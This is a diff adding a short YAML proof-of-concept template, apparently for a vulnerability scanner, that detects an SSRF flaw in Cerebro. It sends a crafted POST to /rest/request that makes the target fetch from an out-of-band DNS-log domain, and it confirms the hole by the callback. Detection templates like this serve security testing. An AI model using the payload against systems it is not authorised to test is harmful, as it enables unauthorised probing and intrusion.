@@ -1,0 +1,28 @@
+id: poc-yaml-cerebro-request-ssrf
+info:
+  name: Cerebro request SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: Cerebro
+  fofa: app="Cerebro"
+variables:
+  reverse: new_dns_log()
+  reverseDomin: reverse.Domain()
+requests:
+- method: POST
+  path: /rest/request
+  headers:
+    Content-Type: application/json
+  data: '{"method":"GET","data":"","path":"robots.txt","host":"https://{{.reverseDomin}}"}
+
+    '
+  expression: 'status_code == 200
+
+    && !contains(body,"<")
+
+    && reverse.Verify()
+
+    '
+transport: http
